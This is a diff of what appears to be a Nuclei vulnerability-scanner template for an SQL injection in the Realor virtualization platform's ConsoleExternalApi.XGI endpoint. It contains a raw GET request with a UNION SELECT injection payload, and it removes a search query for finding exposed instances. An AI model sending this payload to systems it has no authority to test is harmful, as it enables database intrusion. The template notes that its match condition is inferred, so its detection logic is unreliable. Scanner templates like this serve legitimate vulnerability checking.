@@ -3,14 +3,8 @@ info:
   name: 瑞友天翼应用虚拟化系统ConsoleExternalApi.XGISQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7794843f434cb2ac572a8eebbc2e3a42
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 7794843f434cb2ac572a8eebbc2e3a42
-    fofa: + hunter`app.name="REALOR 瑞友天翼虚拟化平台"`
 http:
 - raw:
   - 'GET /ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1+union+select+1,2,3,4,5,md5(1)%23 HTTP/1.1
